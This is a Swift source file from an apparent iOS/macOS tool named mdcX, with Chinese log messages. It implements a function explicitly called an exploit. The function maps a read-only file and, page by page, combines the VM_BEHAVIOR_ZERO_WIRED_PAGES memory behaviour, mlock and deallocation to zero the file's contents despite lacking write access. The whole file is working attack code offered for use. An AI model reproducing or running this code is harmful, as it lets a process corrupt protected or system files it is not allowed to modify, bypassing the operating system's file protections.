//
//  FileZeroExploit.swift
//  mdcX
//
//  Created by 이지안 on 5/13/25.
//

import Foundation
import Darwin
// import Mach

@_silgen_name("mach_vm_behavior_set")
private func mach_vm_behavior_set(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t, _ new_behavior: vm_behavior_t) -> kern_return_t

@_silgen_name("mach_vm_deallocate")
private func mach_vm_deallocate(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t) -> kern_return_t

private func zero_single_page(_ page_address: UnsafeMutableRawPointer?) -> Bool {
    var kr = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        print("调整操作: 设置VM_BEHAVIOR_ZERO_WIRED_PAGES失败: \(String(cString: mach_error_string(kr)))")
        return false
    }

    guard mlock(page_address, Int(vm_page_size)) == 0 else {
        perror("调整操作: mlock失败")
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("调整操作: mlock成功")

    kr = mach_vm_deallocate(mach_task_self_, page_address, mach_vm_size_t(vm_page_size))
    guard kr == KERN_SUCCESS else {
        print("调整操作: vm_deallocate失败: \(String(cString: mach_error_string(kr)))")
        munlock(page_address, Int(vm_page_size))
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("调整操作: 在解除锁定前删除了映射")
    return true
}

@discardableResult
func applySwiftFileZeroExploit(filePath: String, zeroAllPages: Bool = false) -> Int32 {
    let fd = open(filePath, O_RDONLY)
    guard fd != -1 else {
        perror("调整操作: 打开文件\(filePath)失败")
        return 1
    }
    defer { close(fd) }

    var st = stat()
    guard fstat(fd, &st) == 0 else {
        perror("调整操作: 对文件\(filePath)执行fstat失败")
        return -1
    }

    guard st.st_size > 0 else {
        print("调整操作: 文件\(filePath)为空，无需清零。")
        return 0
    }
    
    let mapped_length = Int(st.st_size)
    let ro_addr = mmap(nil, mapped_length, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard ro_addr != MAP_FAILED else {
        perror("调整操作: 对文件\(filePath)进行mmap失败")
        return 2 
    }
    defer { munmap(ro_addr, mapped_length) }

    let numberOfPagesToProcess: UInt
    if zeroAllPages {
        numberOfPagesToProcess = (UInt(st.st_size) + UInt(vm_page_size) - 1) / UInt(vm_page_size)
        print("调整操作: 正在清零\(filePath)的所有\(numberOfPagesToProcess)页。")
    } else {
        numberOfPagesToProcess = st.st_size > 0 ? 1 : 0
        if numberOfPagesToProcess == 1 {
             print("调整操作: 正在清零\(filePath)的第一页。")
        }
    }
    
    if numberOfPagesToProcess == 0 && st.st_size > 0 {
         print("调整操作: 为非空文件计算出0页。这是不正常的。")
         return -2
    }


    for i in 0..<numberOfPagesToProcess {
        guard let page_to_zero = ro_addr?.advanced(by: Int(UInt(vm_page_size) * i)) else {
            print("调整操作: 无法推进到文件\(filePath)的第\(i)页。ro_addr可能为nil。")
            return 3
        }
        print("调整操作: 正在清零文件\(filePath)在\(page_to_zero)的第\(i)页")
        
        guard zero_single_page(page_to_zero) else {
            print("调整操作: 为文件\(filePath)的第\(i)页执行zero_single_page失败。")
            return 3
        }
    }

    print("调整操作: 成功处理\(filePath)的页面。")
    return 0
}
